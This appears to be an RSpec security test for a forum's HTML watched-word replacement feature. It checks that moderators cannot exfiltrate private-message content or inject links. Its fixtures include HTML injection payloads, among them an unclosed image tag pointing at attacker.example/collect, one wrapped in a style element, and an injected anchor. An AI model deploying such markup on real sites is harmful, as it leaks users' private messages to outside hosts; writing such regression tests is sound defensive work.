# frozen_string_literal: true

RSpec.describe "HTML watched word replacements" do
  fab!(:moderator)
  fab!(:sender) { Fabricate(:user, trust_level: TrustLevel[2]) }
  fab!(:recipient) { Fabricate(:user, trust_level: TrustLevel[2]) }

  def create_html_replacement(word:, replacement:)
    sign_in(moderator)
    post "/admin/customize/watched_words.json",
         params: {
           action_key: "replace",
           words: [word],
           replacement: replacement,
           html: true,
         }
    expect(response.status).to eq(200)
  end

  def create_private_message(raw)
    sign_in(sender)
    post "/posts.json",
         params: {
           raw: raw,
           title: "Quarterly numbers",
           archetype: "private_message",
           target_recipients: recipient.username,
         }
    expect(response.status).to eq(200)
    response.parsed_body["topic_id"]
  end

  def cooked_first_post(topic_id, user)
    sign_in(user)
    get "/t/#{topic_id}.json"
    expect(response.status).to eq(200)
    response.parsed_body["post_stream"]["posts"].first["cooked"]
  end

  def expect_secret_kept_as_text(cooked)
    fragment = Nokogiri::HTML5.fragment(cooked)
    expect(fragment.text).to include("the safe code is 4471")
    expect(fragment.css("[src], [href]")).to be_empty
  end

  it "does not leak private message content to the moderator" do
    create_html_replacement(
      word: "alpha",
      replacement: '<img src="https://attacker.example/collect?',
    )
    create_html_replacement(word: "omega", replacement: '">')

    topic_id = create_private_message("alpha the safe code is 4471 omega")

    sign_in(moderator)
    get "/t/#{topic_id}.json"
    expect(response.status).to eq(404)

    expect_secret_kept_as_text(cooked_first_post(topic_id, recipient))
  end

  it "does not leak private message content through raw-text elements" do
    create_html_replacement(
      word: "alpha",
      replacement: '<style><img src="https://attacker.example/collect?',
    )
    create_html_replacement(word: "omega", replacement: '<b title="x">')

    topic_id = create_private_message("alpha the safe code is 4471 omega")

    expect_secret_kept_as_text(cooked_first_post(topic_id, recipient))
  end

  it "does not turn the author's text into a link chosen by the moderator" do
    create_html_replacement(
      word: "alpha",
      replacement: '<a href="https://attacker.example/offers">',
    )

    topic_id = create_private_message("alpha is my recommendation for the rollout")

    cooked = cooked_first_post(topic_id, recipient)
    fragment = Nokogiri::HTML5.fragment(cooked)

    expect(fragment.css("a").map(&:text)).not_to include(" is my recommendation for the rollout")
    expect(fragment.text).to include("is my recommendation for the rollout")
  end
end
